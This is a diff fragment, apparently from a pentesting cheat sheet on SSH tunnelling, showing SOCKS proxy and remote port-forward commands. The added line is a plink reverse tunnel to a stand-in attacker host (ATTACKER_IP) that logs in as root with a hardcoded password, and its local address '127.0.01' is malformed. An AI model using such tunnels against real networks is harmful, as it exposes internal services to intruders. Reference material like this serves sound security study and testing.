@@ -632,6 +632,7 @@ ssh -D 127.0.0.1:8080 user@SSH_SERVER
 # Open port 5555 on SSH_SERVER. Incoming traffic to SSH_SERVER:5555 is tunneled to LOCALHOST:3389
 # Scenario: expose RDP on non-routable network;
 ssh -R 5555:LOCAL_HOST:3389 user@SSH_SERVER
+plink -R ATTACKER:ATTACKER_PORT:127.0.01:80 -l root -pw pw ATTACKER_IP
 ```
 
 #### Proxy Tunnel
